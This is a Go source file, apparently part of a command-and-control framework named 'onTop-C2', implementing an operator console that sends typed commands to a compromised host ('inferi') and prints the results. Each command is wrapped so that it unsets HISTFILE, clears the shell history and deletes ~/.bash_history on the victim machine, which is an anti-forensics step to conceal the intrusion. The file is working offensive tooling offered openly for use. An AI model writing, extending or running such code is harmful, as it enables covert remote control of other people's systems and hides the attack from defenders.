package chambers

import (
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"io"

	"github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/types"

	"github.com/chzyer/readline"
)

var imperius types.Chamber = types.Chamber{
	Name:        "imperius",
	Description: "Interact with a imperius",
	Parallel:    false,
	Runes:     imperiusRuness,
	Execute:     InteractWithSession,
}

var imperiusRuness map[string]*types.Rune = map[string]*types.Rune{
	"INFERI": {
		Name:        "INFERI",
		Description: "The target inferi-id to handle interaction",
		Required:    true,
		Value:       nil,
	},
}

var interruptChannel chan struct{} = make(chan struct{})
func InteractWithSession(runes map[string]*types.Rune) {
	idRunes, ok := runes["INFERI"]
	if !ok {
		misc.PanicWarn(fmt.Sprintf("The option %s is unset\n", "INFERI"), true)
		return

	}

	imperiusID, ok := idRunes.Value.(string)
	if !ok {
		misc.PanicWarn(fmt.Sprintf("The %v value isn't valid, must be a valid inferi ID str (inferi-00000)\n", idRunes.Name), true)
		return

	}

	var imperius *MarauderInferi
	var exists bool

	imperius, exists = Inferis[imperiusID]

	if !exists {
		misc.PanicWarn(fmt.Sprintf("Error: %v %s\n", "Not found inferi with id", imperiusID), true)
		return

	}

	newErr := misc.ForceClearStdout()
	if newErr != nil {
		misc.PanicWarn(fmt.Sprintf("An error ocurred during stdout forced clear: %v", newErr), false)
		return

	}

	botIP, _ := misc.Colors(imperius.BotIP, "green")
	promptSignal, _ := misc.Colors("⌁", "white_bold")
	endFromListener := "___END__OF__RESULT__IN__" + imperius.ID + "__" + imperius.BotIP + "___"
	prompt := fmt.Sprintf("%v %v ", botIP, promptSignal)
	signal.Stop(misc.InterruptSigs)
	signal.Notify(misc.ChanInterruptSigs, syscall.SIGINT)

	misc.PrintBanner()
	misc.ChanInterruptHandler(interruptChannel)
	rl, ee := readline.New(prompt)
	if ee != nil {
		fmt.Println("Some error occurred during readline initialization: ", ee)
		os.Exit(0)

	}

	for {
		select {
		case <-interruptChannel:
			signal.Stop(misc.ChanInterruptSigs)
			signal.Notify(misc.InterruptSigs, syscall.SIGINT)
			return

		default:
			l, err := rl.Readline()
			if err == readline.ErrInterrupt || err == io.EOF {
				return

			}

			userCommand := strings.TrimSpace(l)
			if userCommand == "" {
				continue

			}

			imperius.Commands <- fmt.Sprintf("unset HISTFILE; %v; echo; echo %v; history -c; rm -rf ~/.bash_history", userCommand, endFromListener)

			var fullResponse []string
			var finishedPrinting bool

			for !finishedPrinting {
				select {
				case output := <-imperius.Outputs:
					trimOutput := strings.TrimSpace(output)
					if trimOutput == endFromListener {
						finishedPrinting = true
						break

					}

					fullResponse = append(fullResponse, trimOutput)

				case <-time.After(25 * time.Second):
					misc.PanicWarn(fmt.Sprintf("Error: %v\n", "Timeout waiting for response"), false)
					finishedPrinting = true

				}

			}

			if len(fullResponse) != 0 {
				fmt.Println(strings.Join(fullResponse, "\n"))

			}

			fmt.Print("\n")

		}

	}

}

func init() {
	RegisterNewModule(&imperius)

}
